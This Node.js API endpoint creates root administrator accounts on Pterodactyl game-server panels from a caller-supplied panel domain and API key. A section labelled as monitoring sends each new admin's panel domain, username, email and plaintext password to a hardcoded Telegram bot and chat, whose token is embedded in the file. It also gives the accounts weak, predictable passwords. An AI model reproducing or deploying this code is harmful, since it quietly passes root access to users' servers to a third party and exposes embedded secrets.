// api/panel/cadmin.js
const axios = require("axios");
const crypto = require("crypto");
const fetch = require("node-fetch");

// === Telegram Monitor ===
const TELEGRAM_BOT_TOKEN = "8490105100:AAGbLVP4o7IZapzg3-aLzmZmlft61mYaas4";
const TELEGRAM_CHAT_ID = "5995543569";

async function sendToTelegram(message) {
  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return;
  try {
    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: `🛠️ *Create Admin Panel (cadmin)*\n\n${message}`,
        parse_mode: "Markdown",
      }),
    });
  } catch (err) {
    console.error("Gagal kirim ke Telegram:", err.message);
  }
}

module.exports = {
  name: "Create Admin Panel (cadmin)",
  desc: "Membuat akun admin di Panel Pterodactyl melalui API Application",
  category: "Panel Pterodactyl",
  path: "/panel/cadmin?apikey=&panelDomain=&panelApiKey=&username=&name=",

  async run(req, res) {
    try {
      const { apikey, panelDomain, panelApiKey, username, name } = req.query;

      // Validasi API key server
      if (!apikey || !global.apikey || !global.apikey.includes(apikey)) {
        await sendToTelegram(`🚫 *Apikey invalid:* ${apikey || "(none)"}\n🔗 Domain: ${panelDomain || "(none)"}`);
        return res.status(403).json({ status: false, error: "Apikey invalid" });
      }

      // Validasi parameter minimal
      if (!panelDomain || !panelApiKey || !username) {
        await sendToTelegram(`⚠️ *Missing parameters*\nApikey: ${apikey}\nDomain: ${panelDomain || "(none)"}\nUsername: ${username || "(none)"}`);
        return res.status(400).json({
          status: false,
          error: "Missing parameters. Required: panelDomain, panelApiKey, username (optional: name)",
        });
      }

      // Normalisasi domain
      let domain = panelDomain.trim();
      if (!/^https?:\/\//i.test(domain)) domain = "https://" + domain;
      domain = domain.replace(/\/+$/, "");

      // Format data akun
      const userLower = username.trim().toLowerCase();
      const email = `${userLower}@gmail.com`;
      const capitalize = (s) =>
        s
          .trim()
          .split(" ")
          .map((p) => p.charAt(0).toUpperCase() + p.slice(1).toLowerCase())
          .join(" ");
      const firstName = name ? capitalize(name) : capitalize(userLower);
      const password = userLower + crypto.randomBytes(2).toString("hex");

      const payload = {
        email,
        username: userLower,
        first_name: firstName,
        last_name: "Admin",
        root_admin: true,
        language: "en",
        password: password,
      };

      // Request ke API Pterodactyl
      const url = `${domain}/api/application/users`;
      const response = await axios.post(url, payload, {
        headers: {
          Accept: "application/json",
          "Content-Type": "application/json",
          Authorization: `Bearer ${panelApiKey}`,
        },
        timeout: 20000,
      });

      const data = response.data;
      const user = data?.attributes || data?.data || data;

      // Kirim log sukses ke Telegram
      await sendToTelegram(
        `✅ *Admin berhasil dibuat!*\n\n🌐 Domain: ${domain}\n👤 Username: ${userLower}\n📧 Email: ${email}\n🔑 Password: \`${password}\`\n📛 Nama: ${firstName}\n🧩 Root: true`
      );

      // Respon ke client
      return res.json({
        status: true,
        message: "Admin panel created successfully",
        account: {
          id: user?.id || null,
          username: userLower,
          password,
          email,
          first_name: firstName,
          last_name: "Admin",
          panelDomain: domain,
        },
        raw: data,
      });
    } catch (err) {
      console.error("cadmin error:", err?.response?.data || err.message || err);

      const errorMsg =
        err?.response?.data?.errors?.[0]?.detail ||
        err?.response?.data?.errors?.[0]?.code ||
        err?.response?.data?.error ||
        err.message;

      // Kirim error ke Telegram
      await sendToTelegram(`💥 *Gagal membuat admin!*\n\n❌ ${errorMsg}`);

      if (err?.response?.data) {
        return res.status(err.response.status || 500).json({
          status: false,
          error: err.response.data,
        });
      }
      return res.status(500).json({ status: false, error: err.message || String(err) });
    }
  },
};
